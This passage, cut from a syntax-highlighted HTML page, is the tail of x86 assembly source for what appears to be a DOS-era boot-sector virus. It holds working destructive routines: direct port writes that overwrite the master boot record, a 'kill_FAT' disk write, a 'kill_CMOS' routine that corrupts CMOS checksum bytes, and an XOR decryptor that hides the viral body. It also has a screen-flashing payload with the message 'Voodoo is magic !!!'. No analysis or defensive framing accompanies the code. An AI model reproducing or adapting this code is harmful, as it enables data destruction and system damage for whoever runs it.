  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
  </span><span class="sc5">_ch</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3c8h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">delay</span><span class="sc0">
  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">_ch</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">
  </span><span class="sc5">note</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">popa</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">mesb</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Voodoo is magic !!!'</span><span class="sc0">
</span><span class="sc5">mese</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;----- Write mbr ----------------------------</span><span class="sc0">
</span><span class="sc5">writeMBR_PORT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1F6H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0A0H</span><span class="sc0">     </span><span class="sc1">;Drive descriptor</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SECTCOUNT1</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1F2H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SECTCOUNT1</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SECTNUM1</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc5">OFF</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc5">ON</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1F3H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SECTNUM1</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1F4H</span><span class="sc1">; LOW</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">OFF</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1F5H</span><span class="sc0"> </span><span class="sc1">; HIGH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">OFF</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1F7H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">030H</span><span class="sc0">     </span><span class="sc1">;writeSECT</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GWORD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1F7H</span><span class="sc0">
        </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">;Wait for data</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">GWORD</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1F0H</span><span class="sc0">     </span><span class="sc1">;Get data</span><span class="sc0">
</span><span class="sc5">GLOOP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;       STOSW</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">GLOOP</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">WAITHD</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">3F6H</span><span class="sc0">     </span><span class="sc1">;Turn on IRQ 14 and exit</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">on</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">WAITHD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1F7H</span><span class="sc0">
        </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">WIDOZY</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">WAITHD</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">WIDOZY</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">066ffh</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;________ procedure shr dd___________________________</span><span class="sc0">
</span><span class="sc1">;paramestrs AX=LoDD,DX=HiDD,CX=count bits</span><span class="sc0">
</span><span class="sc1">; reterns   ddWORD(DX,AX)</span><span class="sc0">
</span><span class="sc5">shrDD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0adh</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;________ procedure shl dd___________________________</span><span class="sc0">
</span><span class="sc1">;paramestrs AX=LoDD,DX=HiDD,CX=count bits</span><span class="sc0">
</span><span class="sc1">; reterns   ddWORD(DX,AX)</span><span class="sc0">
</span><span class="sc5">shlDD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0a5h</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c2h</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DecripterBOOT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; Decripter 0 0 2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">sizeV</span><span class="sc0">
</span><span class="sc5">RCRkeyBoot</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">   </span><span class="sc1">;RCRkey</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decriptMBR</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BOOT_ENTEre_point</span><span class="sc0"> </span><span class="sc1">; entry point</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">kill_FAT</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03ffh</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0180h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">kill_CMOS</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc0">
              </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
              </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
              </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
              </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">decriptMBR</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">devr</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">devr</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">@end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Code</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
     </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">
</span><span class="sc1">;===== Cut ====</span></div></body>
</html>
